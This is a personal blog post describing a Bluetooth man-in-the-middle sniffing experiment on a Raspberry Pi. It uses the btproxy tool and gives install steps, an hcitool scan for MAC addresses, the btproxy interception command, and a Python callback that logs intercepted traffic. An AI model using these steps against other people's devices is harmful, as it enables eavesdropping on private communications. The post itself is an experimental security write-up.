---
layout: post
title: Security Sprint&#58 Week 10 &#38 11 - Bluetooth hacking experiment and open tools
author: terceranexus6
image:
  feature: banners/header.jpg
tags: hacking bluetooth seguridad mitm python
---

I've been quite in many things lately, which didn't allow me to study all I wanted to. I'm mainly in two things, distributed ledger experiments and hardware. But I've had in mind a **hacking experiment** for quite a long time, and finally I decided to try it. It's a **Man In The Middle** attack (or sniffing) over bluetooth connections using a python repository, I think I will omit _for what_ I wanted to know that.

<img src="{{ site.url }}/assets/images/dev.to/SaneSpanishCrayfish-max-1mb.gif" style="display: block; margin: 0 auto;">

Anyway, what I want to do here is to catch a connection between two nodes using bluetooth. The first idea is _only_ to capture the content of the connection.  For this I need a linux system, in this case I'm using debian based Raspbian in the RPi 3.  

<img src="{{ site.url }}/assets/images/dev.to/r096d85eunjfpjpc3wdk.jpg" style="display: block; margin: 0 auto;">

On it, I install some packages and clone the [repo](https://github.com/conorpp/btproxy.git) of the tool on github (**git needed here, btw**):

```
$ sudo apt-get install bluez libbluetooth-dev python-dev
$ git clone git://github.com/conorpp/btproxy

```
For installing the tool, simply use `sudo python setup.py install`.

Now we need to [get](https://www.systutorials.com/docs/linux/man/1-hcitool/) the MAC address of the both nodes.

```
$ hcitool scan
```

<img src="{{ site.url }}/assets/images/dev.to/rjcsf6kg5iiufuu7pdz6.jpg" style="display: block; margin: 0 auto;">

Once we have them, we can use them in the [most basic MITM attack](https://github.com/conorpp/btproxy/blob/master/scripts/btproxy) the tool offer, like this:

```
$ sudo btproxy <master-bt-mac-address> <slave-bt-mac-address>
```

The master is the device the sends the connection request and the slave is the device listening for something to connect to it. We can make it better passing a custom script for slave and master, as explained in the README. for this we use `btproxy -s SCRIPT` being the script something like this:

```
# script_example.py
def master_cb(req):
    """
        Received something from master, about to be sent to slave.
    """
    print '<< ', repr(req)
    open('mastermessages.log', 'a+b').write(req)
    return req

def slave_cb(res):
    """
        Same as above but it's from slave about to be sent to master
    """
    print '>> ', repr(res)
    open('slavemessages.log', 'a+b').write(res)
    return res
```
I must say this tool confusing when using two nodes being equal, such as two mobiles phones, and didn't work properly. Also for _that_ kind of sniffing I would suggest [this repo](https://github.com/vshymanskyy/BLESniffer_Python/tree/e9429371a9832d406fd6e897b2dadc2637c64976) instead, which also prepares a .pcap file out of the scanning for the phone traffic, but it might needs [hardware support](https://www.adafruit.com/product/2269), if you have an arduino you [can make](https://github.com/RedBearLab/nRF51822-Arduino) your own, tho. On the other hand, another alternative is [BTJuice](https://github.com/DigitalSecurity/btlejuice), which also works with **python** + **NodeJS**. This tool is very complete and includes an user-friendly interface for using in localhost. Also the commands are very similar to the ones used in btproxy.     

Anyway this is everything I got until now!

*Also written in: [https://dev.to/terceranexus6/security-sprint-week-10--11-bluetooth-hacking--4kh3](https://dev.to/terceranexus6/security-sprint-week-10--11-bluetooth-hacking--4kh3)*
